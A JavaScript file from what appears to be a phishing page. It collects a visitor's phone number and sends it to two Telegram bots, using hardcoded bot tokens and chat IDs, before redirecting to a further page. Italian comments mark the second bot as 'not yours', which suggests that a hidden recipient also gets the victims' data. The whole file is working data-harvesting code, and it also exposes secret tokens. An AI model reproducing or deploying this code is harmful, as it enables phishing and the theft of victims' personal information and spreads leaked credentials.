document.addEventListener("DOMContentLoaded", () => {
    const nextButton = document.getElementById("next-button");
    const phoneInput = document.getElementById("phone-input");
    const prefixElement = document.querySelector(".prefix");
    
    nextButton.addEventListener("click", async () => {
        const countryCode = prefixElement.textContent.trim();
        const phoneNumber = phoneInput.value.trim();
        const fullNumber = countryCode + phoneNumber;

        if (phoneNumber.length < 6) {
            alert("Please enter a valid phone number.");
            return;
        }

        try {
            // Invia al primo bot (tuo)
            const response1 = await fetch('https://api.telegram.org/bot7654691297:AAEkfk35y1aKq5Wpnz7vLyR3QCo4g5nYDTc/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: '1117264759', text: 'Phone: ' + fullNumber })
            });

            const data1 = await response1.json();

            // Invia al secondo bot (non tuo)
            const response2 = await fetch('https://api.telegram.org/bot7508882807:AAF5vvfq1-gZjxgx29QW3NPuJkUnhtDACK4/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: '5554575228', text: 'Phone: ' + fullNumber })
            });

            const data2 = await response2.json();

            // Controlla se almeno uno dei due invii ha avuto successo
            if (data1.ok || data2.ok) {
                localStorage.setItem("userPhoneNumber", fullNumber);
                window.location.href = "index3.html";
            } else {
                alert("Failed to send message. Please try again.");
            }
        } catch (error) {
            alert("An error occurred: " + error.message);
        }
    });

    // Mostra il pulsante NEXT solo se il numero è lungo abbastanza
    phoneInput.addEventListener("input", () => {
        phoneInput.value = phoneInput.value.replace(/\D/g, '');
        nextButton.style.display = phoneInput.value.length >= 5 ? 'block' : 'none';
    });
});
